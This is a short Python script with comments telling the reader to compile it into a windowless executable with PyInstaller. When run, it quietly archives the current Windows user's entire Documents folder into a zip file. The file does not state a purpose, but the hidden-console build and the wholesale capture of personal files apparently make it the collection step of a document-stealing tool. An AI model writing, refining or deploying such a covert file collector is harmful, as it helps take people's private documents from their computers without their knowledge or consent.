# Edit it yourself if needed
# pip install pyinstaller
# Compile using "pyinstaller --onefile --noconsole pythonfile.py"
# Sorry Compile it yourself bcs i didn't download python dev on visual studio eheh
# i think no need to edit
import zipfile
import os
import getpass

def zip_directory(directory_path, zip_path):
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(directory_path):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, directory_path)
                zipf.write(file_path, arcname)

# Get username
username = getpass.getuser()
# Directory to be zipped
directory_pathone = 'C:\\Users\\'
directory_pathtwo = '\\Documents'
directory_path = directory_pathone + username + directory_pathtwo
# Output ZIP file path
zip_path = 'documents.zip'

# Zip the directory
zip_directory(directory_path, zip_path)
